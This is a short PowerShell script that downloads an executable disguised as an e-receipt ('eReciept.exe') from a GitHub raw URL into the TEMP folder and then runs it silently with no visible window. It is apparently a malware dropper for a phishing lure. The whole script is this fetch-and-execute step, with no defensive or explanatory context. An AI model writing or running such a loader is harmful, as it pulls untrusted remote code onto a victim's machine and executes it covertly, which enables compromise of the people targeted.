# Define the URL and the destination path for the download
$url = "https://github.com/777finnesse/2repo777/raw/refs/heads/main/12R628X3YW8072841_eReciept.exe"
$output = "$env:TEMP\12R628X3YW8072841_eReciept.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Run the downloaded executable silently
Start-Process -FilePath $output -ArgumentList "/silent" -NoNewWindow -Wait
